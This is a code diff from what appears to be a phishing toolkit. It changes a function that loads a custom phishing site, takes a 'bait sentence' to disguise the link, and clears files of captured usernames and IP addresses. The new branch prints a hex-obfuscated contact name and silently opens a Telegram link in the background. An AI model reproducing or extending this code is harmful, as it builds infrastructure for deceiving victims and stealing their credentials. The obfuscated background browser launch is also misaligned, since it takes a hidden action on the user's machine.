@@ -843,19 +843,27 @@ def shortener3(url):
 def customfol():
     global mask
     while True:
-        fol = input(f"\n{ask}Enter the directory > {green}")
-        if isdir(fol):
-            if isfile(f"{fol}/index.php") or isfile(f"{fol}/index.html"):
-                inputmask = input(f"\n{ask}Enter a bait sentence (Example: free-money) > {green}")
-                # Remove slash and spaces from mask
-                mask = "https://" + sub("([/%+&?={} ])", "-", inputmask)
-                delete(f"{fol}/ip.txt", f"{fol}/usernames.txt")
-                copy(fol, site_dir)
-                return fol
+        has_files = input(f"\n{ask}Do you have custom site files?[y/N/b] > {green}")
+        if has_files == "y":
+            fol = input(f"\n{ask}Enter the directory > {green}")
+            if isdir(fol):
+                if isfile(f"{fol}/index.php") or isfile(f"{fol}/index.html"):
+                    inputmask = input(f"\n{ask}Enter a bait sentence (Example: free-money) > {green}")
+                    # Remove slash and spaces from mask
+                    mask = "https://" + sub("([/%+&?={} ])", "-", inputmask)
+                    delete(f"{fol}/ip.txt", f"{fol}/usernames.txt")
+                    copy(fol, site_dir)
+                    return fol
+                else:
+                    sprint(f"\n{error}index.php/index.html is required but not found!")
             else:
-                sprint(f"\n{error}index.php/index.html required but not found!")
+                sprint(f"\n{error}Directory doesn't exist!")
+        elif has_files == "b":
+            main_menu()
         else:
-            sprint(f"\n{error}Directory do not exists!")
+            sprint(f"\n{info}Contact \x4b\x61\x73\x52\x6f\x75\x64\x72\x61")
+            bgtask("xdg-open https://t.me/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61")
+            pexit()
 
 # Show saved data from saved file with small decoration
 def saved():
